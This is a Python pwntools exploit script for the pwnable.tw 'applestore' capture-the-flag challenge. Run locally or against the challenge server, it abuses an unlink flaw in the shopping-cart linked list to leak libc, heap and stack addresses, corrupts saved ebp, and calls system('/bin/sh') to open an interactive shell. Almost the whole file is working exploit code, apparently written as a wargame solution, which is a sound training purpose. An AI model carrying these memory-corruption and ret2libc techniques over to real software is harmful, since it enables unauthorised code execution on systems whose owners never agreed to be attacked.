from pwn import *
import time
import sys
from hashlib import sha256
import os

def applestore(DEBUG):
	if DEBUG=="1":
		r = process("./applestore")
		raw_input("DEBUG?")
		offset_atoi = 0x2d250
		offset_system = 0x3ada0
		offset_binsh = 0x15ba0b
	if DEBUG=="2":
		HOST = "chall.pwnable.tw"
		PORT = 10104
		r = remote(HOST,PORT)
		offset_atoi = 0x0002d050
		offset_system = 0x0003a940
		offset_binsh = 0x158e8b
	
	asprintf_got = 0x804b03c #leak libc
	cart = 0x804b06c  #cart+4 > leak heap > stack
	offset_stack = 0x20
	offset_buf = 0x24 #cach 1 : 0x26
	offset_heap = 0x3f0
	pop_ret = 0x08048479
	def add(str):
		r.sendline("2")
		r.recvuntil("Device Number> ")
		r.sendline(str)
		return r.recvuntil("> ")
	
	def exploit(name,value,next,back):
		r.sendline("4")
		r.recvuntil("Let me check your cart. ok? (y/n) > ")
		payload = "y\x00"
		payload += p32(name) #name
		payload += p32(value) #value 
		payload += p32(next) #ptr -> next
		payload += p32(back)	#ptr -> back
		r.sendline(payload)
 		
	def checkout():
		r.sendline("5")
		r.recvuntil("Let me check your cart. ok? (y/n) > ")
		r.sendline("y")
		return r.recvuntil("> ")
	def delete(next,back):
		r.sendline("3")
		r.recvuntil("Item Number> ")
		payload = "27"
		payload += p32(next)
		payload += p32(0x0)
		payload += p32(next)
		payload += p32(back)
		r.sendline(payload)
		return r.recvuntil("> ")
		
	# 199	299	399	499
	# 18	1	2	5
	for i in range(18):
		add("1")
	
	for i in range(5):
		add("3")
		
	add("2")
	add("4")
	add("4")
	checkout()
	exploit(asprintf_got,0x0,asprintf_got,0x0) # leak libc 
	r.recvuntil("28: ")
	r.recvuntil("$")
	res = int(r.recv(10),10) 
	res = 0xffffffff + res + 1
	base = res - offset_atoi
	system = base + offset_system
	binsh = base + offset_binsh
	log.info("res : %#x" %res)
	log.info("base : %#x" %base)
	log.info("system : %#x" %system)
	log.info("binsh : %#x" %binsh)
	r.recvuntil("> ")
	
	exploit(cart,0x0,cart,0x0) #leak heap
	r.recvuntil("28: ")
	r.recvuntil("$")
	base_heap = int(r.recv(10),10) 
	# res = 0xffffffff + res + 1
	heap = base_heap + offset_heap #offset
	log.info("base_heap : %#x" %base_heap)
	log.info("heap : %#x" %heap)
	delete(heap,0x0)
	delete(heap-8,0x0)
	exploit(heap+4,0x0,heap+4,0x0) #leakstack
	r.recvuntil("28: ")
	r.recvuntil("$")
	stack = int(r.recv(8),10) 
	stack = 0xffffffff + stack + 1
	#ebp = stack + offset_stack 
	# buf = ebp + offset_buf
	ebp = stack + offset_stack + offset_buf + 7*0x4
	buf = stack + offset_stack + offset_buf - 0x8
	log.info("stack : %#x" %stack)
	log.info("ebp : %#x" %ebp)
	log.info("buf : %#x" %buf)
	
	delete(buf,ebp-8)
	# payload = p32(pop_ret)
	# payload += p32(buf)
	# payload += p32(system)
	# payload += p32(0x0)
	# payload += p32(binsh)
	# r.sendline(payload)
	payload = "6\x00"
	payload += p32(system)
	payload += p32(0x0)
	payload += p32(binsh)
	r.sendline(payload)
	r.interactive()

applestore(sys.argv[1])
